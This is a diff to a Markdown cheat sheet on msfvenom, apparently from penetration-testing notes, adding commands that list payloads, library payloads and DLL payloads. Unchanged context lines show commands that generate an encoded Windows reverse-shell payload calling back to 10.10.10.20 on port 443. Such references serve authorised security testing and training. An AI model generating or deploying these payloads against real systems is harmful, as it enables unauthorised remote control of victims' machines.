@@ -1,6 +1,12 @@
 # Msfvenom
 
-## Operating System Payloads
+## List Payloads
+
+You may list payloads with the following command:
+
+```text
+msfvenom --list payloads
+```
 
 ## Staged and Stageless
 
@@ -113,5 +119,21 @@ Creating a msfvenom payload with an encoder while removing bad characters:
 ```text
 msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c EXITFUNC=thread
 msfvenom -a x64 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c EXITFUNC=thread
+```
+
+## Library Payloads
+
+You may list libraries with the following command:
+
+```text
+msfvenom --list payloads | grep -i library
+```
+
+### DLL Payloads
+
+You can list the payloads that use DLLs with the following command:
+
+```text
+msfvenom --list payloads | grep -i DLL
 ```
 
